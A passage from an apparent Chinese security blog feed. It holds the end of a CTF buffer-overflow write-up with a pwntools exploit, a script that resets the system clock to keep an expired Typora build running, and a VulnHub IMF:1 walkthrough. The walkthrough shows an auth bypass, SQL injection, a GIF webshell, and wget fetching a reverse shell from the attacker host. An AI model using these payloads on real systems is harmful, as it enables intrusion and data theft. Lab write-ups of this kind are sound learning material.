(_IO_2_1_stdout_) ◂— 0xfbad2887<br>1b:00d8│          0x7fffffffdf18 —▸ 0x7ffff7a88957 (_IO_default_setbuf+23) ◂— cmp    eax, -1<br>1c:00e0│          0x7fffffffdf20 —▸ 0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2887<br>1d:00e8│          0x7fffffffdf28 ◂— 0x0<br>... ↓<br>1f:00f8│          0x7fffffffdf38 —▸ 0x7ffff7a85449 (_IO_file_setbuf+9) ◂— test   rax, rax<br>20:0100│          0x7fffffffdf40 —▸ 0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2887<br>21:0108│          0x7fffffffdf48 ◂— 0x1e01344de41fba00<br>22:0110│          0x7fffffffdf50 ◂— 0x0<br>... ↓<br>24:0120│          0x7fffffffdf60 —▸ 0x4008b0 ◂— push   r15<br>25:0128│          0x7fffffffdf68 —▸ 0x4006e7 ◂— xor    eax, eax<br>26:0130│          0x7fffffffdf70 ◂— 0x0<br>27:0138│          0x7fffffffdf78 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax<br>28:0140│          0x7fffffffdf80 ◂— 0x1<br>29:0148│          0x7fffffffdf88 —▸ 0x7fffffffe058 —▸ 0x7fffffffe38d ◂— 0x77702f656d6f682f (&#x27;/home/pw&#x27;)<br>2a:0150│          0x7fffffffdf90 ◂— 0x1f7ffcca0<br>2b:0158│          0x7fffffffdf98 —▸ 0x4006d0 ◂— sub    rsp, 8<br>2c:0160│          0x7fffffffdfa0 ◂— 0x0<br>2d:0168│          0x7fffffffdfa8 ◂— 0x46bc826743e3b977<br>2e:0170│          0x7fffffffdfb0 —▸ 0x4006ee ◂— xor    ebp, ebp<br>2f:0178│          0x7fffffffdfb8 —▸ 0x7fffffffe050 ◂— 0x1<br>30:0180│          0x7fffffffdfc0 ◂— 0x0<br>... ↓<br>32:0190│          0x7fffffffdfd0 ◂— 0xb9437d18ed83b977<br>33:0198│          0x7fffffffdfd8 ◂— 0xb9436da2fd73b977<br>34:01a0│          0x7fffffffdfe0 ◂— 0x0<br>... ↓<br>37:01b8│          0x7fffffffdff8 —▸ 0x7fffffffe068 —▸ 0x7fffffffe3bf ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;<br>38:01c0│          0x7fffffffe000 —▸ 0x7ffff7ffe168 ◂— 0x0<br>39:01c8│          0x7fffffffe008 —▸ 0x7ffff7de780b (_dl_init+139) ◂— jmp    0x7ffff7de77e0<br>3a:01d0│          0x7fffffffe010 ◂— 0x0<br>... ↓<br>3c:01e0│          0x7fffffffe020 —▸ 0x4006ee ◂— xor    ebp, ebp<br>3d:01e8│          0x7fffffffe028 —▸ 0x7fffffffe050 ◂— 0x1<br>3e:01f0│          0x7fffffffe030 ◂— 0x0<br>3f:01f8│          0x7fffffffe038 —▸ 0x400717 ◂— hlt    <br>40:0200│          0x7fffffffe040 —▸ 0x7fffffffe048 ◂— 0x1c<br>41:0208│          0x7fffffffe048 ◂— 0x1c<br>42:0210│ r13      0x7fffffffe050 ◂— 0x1<br>43:0218│          0x7fffffffe058 —▸ 0x7fffffffe38d ◂— 0x77702f656d6f682f (&#x27;/home/pw&#x27;)<br>44:0220│          0x7fffffffe060 ◂— 0x0<br>45:0228│          0x7fffffffe068 —▸ 0x7fffffffe3bf ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> distance <span class="hljs-variable">$rsp</span> 0x7fffffffe058</span><br><span class="hljs-meta">0x7fffffffde40-&gt;</span><span class="bash">0x7fffffffe058 is 0x218 bytes (0x43 words)</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=process(<span class="hljs-string">&quot;./smashes&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>);<br><br>flag_addr=<span class="hljs-number">0x400d20</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x218</span>+p64(flag_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="echo2"><a href="#echo2" class="headerlink" title="echo2"></a>echo2</h2><p><a href="http://www.chiange.com/test/">[pwnable.kr] echo2 (Rewritten with .md) – Chiang E’s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Typora开发版无法使用解决方法</title>
    <link href="/2022/05/06/MessUp/Typora%E5%BC%80%E5%8F%91%E7%89%88%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <url>/2022/05/06/MessUp/Typora%E5%BC%80%E5%8F%91%E7%89%88%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<blockquote><p>原文链接：<a href="https://www.cnblogs.com/coming1890/p/16034861.html">https://www.cnblogs.com/coming1890/p/16034861.html</a></p></blockquote><p>我的Typora版本0.11，今天打开发现竟然无法使用，直接报错如下：</p><p><img src="https://img2022.cnblogs.com/blog/2124886/202203/2124886-20220321150804624-1277341931.png" alt="img"></p><p>于是我更改系统时间将时间调整到 2020年01月01日，就可以正常打开了；可是当我使用 Chrome 浏览器上网时，居然又提示我的时钟慢了，于是我只能又将时间同步，再看 typora 还能正常运行（保险起见可以禁止 Typora.exe 文件联网）</p><p>于是，我为了正常使用 typora，只能先将时间调前，然后打开程序，然后再同步时间，我觉得太麻烦了，所以写下了如下 cmd 脚本来完成这些操作</p><p><strong>main.cmd：</strong></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">set</span> datevar=<span class="hljs-variable">%date:~0,4%</span>/<span class="hljs-variable">%date:~5,2%</span>/<span class="hljs-variable">%date:~8,2%</span><br><span class="hljs-built_in">cmd</span> /c <span class="hljs-variable">%USERPROFILE%</span>\Documents\Share\lauch_typora.<span class="hljs-built_in">cmd</span><br>python -c &quot;from <span class="hljs-built_in">time</span> import sleep; sleep(<span class="hljs-number">4</span>)&quot;<br><span class="hljs-built_in">date</span> <span class="hljs-variable">%datevar%</span><br></code></pre></td></tr></table></figure><p><strong>lauch_typora.cmd：</strong></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">date</span> <span class="hljs-number">2020</span>/<span class="hljs-number">01</span>/<span class="hljs-number">01</span><br><span class="hljs-built_in">Start</span> <span class="hljs-variable">%SystemDrive%</span>\Exec\Typora\Typora.exe<br></code></pre></td></tr></table></figure><p>以管理员权限运行 main.cmd 即可</p><p>注意：将 lauch_typora.cmd 与 Typora.exe 的路径换成自己的</p>]]></content>
    
    
    <categories>
      
      <category>Typora</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Typora</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IMF：1</title>
    <link href="/2022/05/02/Penetration/Vulnhub/Part-1/0x03%20IMF/"/>
    <url>/2022/05/02/Penetration/Vulnhub/Part-1/0x03%20IMF/</url>
    
    <content type="html"><![CDATA[<h1 id="0x03-IMF-1-vulnhub"><a href="#0x03-IMF-1-vulnhub" class="headerlink" title="0x03 IMF: 1~vulnhub"></a>0x03 IMF: 1~vulnhub</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/imf-1,162/">IMF: 1 ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.146</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24    <span class="hljs-comment"># 扫描该网段上活跃的主机</span></span><br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.146</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sS -A -p- 192.168.135.146     <span class="hljs-comment"># 全端口扫描</span></span><br></code></pre></td></tr></table></figure><p><strong>简单的端口扫描：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.146</span><br></code></pre></td></tr></table></figure><p><strong>全面扫描：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.146</span><br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th></tr></thead><tbody><tr><td>80/tcp</td><td>open</td><td>http</td></tr></tbody></table></div><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>在前期的信息搜集后得知，这是一个纯虚拟靶场。</p><p>访问 <code>192.168.135.146:80</code> ，没有发现什么，查看源码，得到一个提示，进行解密：</p> <!-- flag1{YWxsdGhlZmlsZXM=} --> ===> allthefiles查看文件，发现三个奇怪的文件名：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- Js --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vendor/modernizr-2.6.2.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vendor/jquery-1.10.2.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/bootstrap.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/ZmxhZzJ7YVcxbVl.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/XUnRhVzVwYzNS.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/eVlYUnZjZz09fQ==.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">       <span class="hljs-keyword">new</span> WOW(</span><br><span class="javascript">          ).init();</span><br><span class="javascript">      </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>显然是 base64 ，进行解码：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==</span><br><span class="hljs-string">===&gt;flag2&#123;aW1mYWRtaW5pc3RyYXRvcg==&#125;</span><br><span class="hljs-string">===&gt;imfadministrator</span><br></code></pre></td></tr></table></figure><p>访问 <code>192.168.135.146/imfadministrator</code> ，发现是个登录界面，查看源码，得到提示：</p><!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger --><p>通过注释得知密码是直接写在 php 文件里的。猜测是使用 strcmp 之类的来判断密码。当 strcmp 的两个字符串参数相等的时候会返回0，但如果把 string 和 array 相比较的话，strcmp 也会返回 0。</p><p>随便尝试几个登录，出现 Invalid username. 的提示，说明用户名和密码是分别验证的，而且密码是写死的。这样就可以先爆破用户名，在绕过密码验证。</p><p>使用 cewl 对站点生成字典：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cewl 192.168.135.146 -w user.txt</span> <br>CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wc -l user.txt</span>                  <br>136 user.txt<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sort user.txt -u -o user_unique.txt</span><br></code></pre></td></tr></table></figure><p>使用 burp 进行抓包，通过生成的字典对 user 进行爆破。</p><p>通过筛选长度得到正确的用户名：user=rmichaels</p><p>将 pass 传入一个数组进行绕过，成功进入。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">POST</span> <span class="hljs-string">/imfadministrator/</span> <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-attr">Host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.135</span><span class="hljs-number">.146</span><br><span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(X11;</span> <span class="hljs-string">Linux</span> <span class="hljs-string">x86_64;</span> <span class="hljs-string">rv:78.0)</span> <span class="hljs-string">Gecko/20100101</span> <span class="hljs-string">Firefox/78.0</span><br><span class="hljs-attr">Accept:</span> <span class="hljs-string">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="hljs-attr">Accept-Language:</span> <span class="hljs-string">en-US,en;q=0.5</span><br><span class="hljs-attr">Accept-Encoding:</span> <span class="hljs-string">gzip,</span> <span class="hljs-string">deflate</span><br><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br><span class="hljs-attr">Content-Length:</span> <span class="hljs-number">21</span><br><span class="hljs-attr">Origin:</span> <span class="hljs-string">http://192.168.135.146</span><br><span class="hljs-attr">Connection:</span> <span class="hljs-string">close</span><br><span class="hljs-attr">Referer:</span> <span class="hljs-string">http://192.168.135.146/imfadministrator/</span><br><span class="hljs-attr">Cookie:</span> <span class="hljs-string">PHPSESSID=8m3g812nee3t6fk5716apmos03</span><br><span class="hljs-attr">Upgrade-Insecure-Requests:</span> <span class="hljs-number">1</span><br><br><span class="hljs-string">user=admin&amp;pass[]=admin</span><br></code></pre></td></tr></table></figure><p>得到第三个提示，进行解码，提示进入cms。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">flag3&#123;Y29udGludWVUT2Ntcw==&#125;</span><br><span class="hljs-string">Welcome,</span> <span class="hljs-string">rmichaels</span><br><span class="hljs-string">IMF</span> <span class="hljs-string">CMS</span><br><br><span class="hljs-string">===&gt;continueTOcms</span><br></code></pre></td></tr></table></figure><p>进入cms后，发现什么都没有，看到页面链接是带有参数，猜测可能存在SQL注入。</p><p>验证一下，页面链接后加个单引号，通过测试得知的确存在SQL注入。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">payload:</span> <span class="hljs-string">http://192.168.135.146/imfadministrator/cms.php?pagename=home&#x27;</span><br><br><span class="hljs-attr">Warning:</span> <span class="hljs-string">mysqli_fetch_row()</span> <span class="hljs-string">expects</span> <span class="hljs-string">parameter</span> <span class="hljs-number">1</span> <span class="hljs-string">to</span> <span class="hljs-string">be</span> <span class="hljs-string">mysqli_result,</span> <span class="hljs-string">boolean</span> <span class="hljs-string">given</span> <span class="hljs-string">in</span> <span class="hljs-string">/var/www/html/imfadministrator/cms.php</span> <span class="hljs-string">on</span> <span class="hljs-string">line</span> <span class="hljs-number">29</span><br></code></pre></td></tr></table></figure><p>sqlmap 注入：</p><blockquote><p>注意这里是在登陆成功之后才有的注入点，所以注入时要带有登陆成功的 Cookie，把前面的 burp 抓到的 cookie 复制下来。或者直接将 burp 抓到的包保存为文本文件，通过 -r 参数使用。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sqlmap -u <span class="hljs-string">&#x27;http://192.168.135.146/imfadministrator/cms.php?pagename=home&#x27;</span> --cookie <span class="hljs-string">&#x27;HPSESSID=8m3g812nee3t6fk5716apmos03&#x27;</span> --dump all</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sqlmap -r head.txt -dump</span><br></code></pre></td></tr></table></figure><p>得到两个图片，访问得到一个二维码，扫码得到 flag4：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;img src=<span class="hljs-string">&quot;./images/whiteboard.jpg&quot;</span>&gt;<br>&lt;img src=<span class="hljs-string">&quot;./images/redacted.jpg&quot;</span>&gt;<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">135.146</span><span class="hljs-regexp">/imfadministrator/im</span>ages/redacted.jpg<br>===&gt; null<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">135.146</span><span class="hljs-regexp">/imfadministrator/im</span>ages/whiteboard.jpg<br>===&gt; flag4&#123;dXBsb2Fkcjk0Mi5waHA=&#125; ===&gt; uploadr942.php<br></code></pre></td></tr></table></figure><p>访问 <code>http://192.168.135.146/imfadministrator/uploadr942.php</code> ，发现是文件上传，经测试只能上传图片。</p><p>构造 gif 文件木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$wzz</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wzz&#x27;</span>]; <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$wzz</span>`; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>成功上传，查看源码，得到文件在服务器上的文件名。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">Intelligence Upload Form<br>File successfully uploaded. <br><br><span class="hljs-comment">&lt;!-- 6e8acf9700f3 --&gt;</span><br></code></pre></td></tr></table></figure><p>访问发现不存在，猜测可能上传到了 uploads 目录，加上目录后成功访问到。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.135.146</span>/imfadministrator/<span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif<br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.135.146</span>/imfadministrator/uploads/<span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif<br><span class="hljs-attribute">GIF89a</span><br></code></pre></td></tr></table></figure><p>查看用户 id 和目录下的文件，发现 flag5 文件，打开查看得到 flag5 ，进行解密得到 <strong>agentservices</strong>，提示 agent 服务。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.135.146</span>/imfadministrator/uploads/<span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif?wzz=id<br><span class="hljs-attribute">GIF89a</span> uid=<span class="hljs-number">33</span>(www-data) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data) <br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.135.146</span>/imfadministrator/uploads/<span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif?wzz=ls<br><span class="hljs-attribute">GIF89a</span> <span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif flag<span class="hljs-number">5</span>_abc<span class="hljs-number">123</span>def.txt <br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.135.146</span>/imfadministrator/uploads/<span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif?wzz=cat%<span class="hljs-number">20</span>flag<span class="hljs-number">5</span>_abc<span class="hljs-number">123</span>def.txt<br><span class="hljs-attribute">GIF89a</span> flag<span class="hljs-number">5</span>&#123;YWdlbnRzZXJ<span class="hljs-number">2</span>aWNlcw==&#125; <br></code></pre></td></tr></table></figure><p>为方便后面的操作，先上传一个 php reverse shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查找 shell</span><br><span class="hljs-meta">$</span><span class="bash"> locate php-reverse-shell</span><br>/home/kali/Desktop/php-reverse-shell.php<br>/usr/share/laudanum/php/php-reverse-shell.php<br>/usr/share/laudanum/wordpress/templates/php-reverse-shell.php<br>/usr/share/webshells/php/php-reverse-shell.php<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cp /usr/share/webshells/php/php-reverse-shell.php ./</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 修改ip和port</span><br><span class="hljs-meta">$</span><span class="bash"> vim php-reverse-shell.php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 通过 python 开启本地 http 服务</span><br><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> kali 监听</span><br>nc -vlp 1234<br></code></pre></td></tr></table></figure><p>在刚刚获取的低权限用户中获取 shell：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">http://192.168.135.146/imfadministrator/uploads/6e8acf9700f3.gif?wzz=wget</span> <span class="hljs-string">http://192.168.135.141:8888/php-reverse-shell.php</span><br><br><span class="hljs-comment"># 查看，成功上传</span><br><span class="hljs-string">http://192.168.135.146/imfadministrator/uploads/6e8acf9700f3.gif?wzz=ls</span><br><span class="hljs-string">GIF89a</span> <span class="hljs-string">6e8acf9700f3.gif</span> <span class="hljs-string">flag5_abc123def.txt</span> <span class="hljs-string">php-reverse-shell.php</span> <br><br><span class="hljs-comment"># 访问</span><br><span class="hljs-string">http://192.168.135.146/imfadministrator/uploads/php-reverse-shell.php</span><br></code></pre></td></tr></table></figure><p>成功得到 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -vlp 1234</span><br>listening on [any] 1234 ...<br>connect to [192.168.135.141] from 192.168.135.146 [192.168.135.146] 43812<br>Linux imf 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux<br> 21:14:54 up  8:38,  0 users,  load average: 0.03, 0.01, 0.06<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br></code></pre></td></tr></table></figure><p>连接之后根据提示查找叫 agent 的服务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> whereis agent</span><br>agent: /usr/local/bin/agent<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /usr/<span class="hljs-built_in">local</span>/bin</span>      <br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>access_codes<br>agent<br><span class="hljs-meta">$</span><span class="bash"> cat access_codes</span><br>SYN 7482,8279,9467<br></code></pre></td></tr></table></figure><p>看起来像是运行了 knock 。先按顺序扫描这三个端口，再重新扫描一遍靶机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -p7482,8279,9467 192.168.135.146</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-04 21:12 EDT<br>Nmap scan report for 192.168.135.146 (192.168.135.146)<br>Host is up (0.0027s latency).<br><br>PORT     STATE    SERVICE<br>7482/tcp filtered unknown<br>8279/tcp filtered unknown<br>9467/tcp filtered unknown<br><br>Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nmap -p- 192.168.135.146</span>          <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-04 22:29 EDT<br>Nmap scan report for 192.168.135.146 (192.168.135.146)<br>Host is up (0.0028s latency).<br>Not shown: 65533 filtered ports<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>7788/tcp open  